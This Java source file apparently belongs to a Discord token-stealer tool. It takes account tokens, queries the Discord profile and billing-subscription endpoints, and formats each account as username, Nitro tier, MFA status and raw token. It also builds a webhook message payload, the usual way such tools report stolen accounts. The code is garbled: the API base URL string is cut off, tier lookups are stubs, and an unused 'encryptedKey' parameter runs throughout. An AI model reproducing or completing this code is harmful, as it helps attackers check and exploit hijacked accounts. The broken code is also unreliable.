import java.time.Duration;
import java.time.OffsetDateTime;
import java.util.ArrayList;
import java.util.StringJoiner;
import java.util.concurrent.Callable;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import org.json.JSONArray;
import org.json.JSONObject;

public class TokenScriptBuilder {

    private static final String DISCORD_API_BASE = "https:

    private static OkHttpClient httpClient;

    public static String formatTokenInfo(String token, long encryptedKey) {
        try {

            JSONObject userInfo = apiGetObject(encryptedKey, "users/@me", token);
            if (userInfo == null) return "";

            String username = userInfo.optString("username", "");

            long premiumType = userInfo.optLong("premium_type", 0)
                             | userInfo.optLong("premium_guild_since", 0);

            String nitroTier = getNitroTier(encryptedKey, token, premiumType);

            boolean mfaEnabled = userInfo.optBoolean("mfa_enabled", false);
            String mfaStr = mfaEnabled ? "✅" : "❌";

            return String.format("%s | %s | %s | %s",
                username,
                nitroTier.isEmpty() ? "None" : nitroTier,
                mfaStr,
                token
            );

        } catch (Exception e) {
            return "";
        }
    }

    private static String getNitroTier(long encryptedKey, String token, long premiumType) {
        StringJoiner joiner = new StringJoiner("\n");

        JSONArray subscriptions = apiGetArray(encryptedKey, "users/@me/billing/subscriptions", token);

        if (subscriptions != null && subscriptions.length() > 0) {

            String subTier = getTierFromSubscription(encryptedKey, subscriptions.toString());
            joiner.add(subTier);
        }

        if (premiumType > 0 || subscriptions != null) {
            String premiumTier = getTierFromPremiumType(encryptedKey, subscriptions != null ? subscriptions.toString() : null);
            joiner.add(premiumTier);
        }

        return joiner.toString();
    }

    private static String getTierFromSubscription(long encryptedKey, String subscriptionData) {

        return "None";
    }

    private static String getTierFromPremiumType(long encryptedKey, String subscriptionData) {

        return "None";
    }

    public static JSONObject apiGetObject(long encryptedKey, String endpoint, String token) {
        try {
            OkHttpClient client = getHttpClient(encryptedKey);
            if (client == null) return null;

            Request request = new Request.Builder()
                .url(DISCORD_API_BASE + endpoint)
                .addHeader("Authorization", token)
                .addHeader("Content-Type", "application/json")
                .get()
                .build();

            okhttp3.Response response = client.newCall(request).execute();
            try {
                if (!response.isSuccessful() || response.body() == null) return null;
                return new JSONObject(response.body().string());
            } finally {
                response.close();
            }

        } catch (Exception e) {
            return null;
        }
    }

    public static JSONArray apiGetArray(long encryptedKey, String endpoint, String token) {
        try {
            OkHttpClient client = getHttpClient(encryptedKey);
            if (client == null) return null;

            Request request = new Request.Builder()
                .url(DISCORD_API_BASE + endpoint)
                .addHeader("Authorization", token)
                .addHeader("Content-Type", "application/json")
                .get()
                .build();

            okhttp3.Response response = client.newCall(request).execute();
            try {
                if (!response.isSuccessful() || response.body() == null) return null;
                return new JSONArray(response.body().string());
            } finally {
                response.close();
            }

        } catch (Exception e) {
            return null;
        }
    }

    public static JSONObject buildWebhookPayload(String content, String username, boolean tts) {
        JSONObject payload = new JSONObject();
        payload.put("content", content);
        payload.put("username", username);
        payload.put("tts", tts);
        return payload;
    }

    private static synchronized OkHttpClient getHttpClient(long encryptedKey) {
        if (httpClient == null) {
            try {
                httpClient = new OkHttpClient.Builder()
                    .connectTimeout(10, TimeUnit.SECONDS)
                    .readTimeout(30, TimeUnit.SECONDS)
                    .build();
            } catch (Exception e) {

            }
        }
        return httpClient;
    }

    public static Duration getAccountAge(String userId) {
        try {
            long snowflake = Long.parseLong(userId);
            long timestampMs = (snowflake >> 22) + 1420070400000L;
            OffsetDateTime created = OffsetDateTime.ofInstant(
                java.time.Instant.ofEpochMilli(timestampMs),
                java.time.ZoneOffset.UTC
            );
            return Duration.between(created, OffsetDateTime.now());
        } catch (Exception e) {
            return Duration.ZERO;
        }
    }
}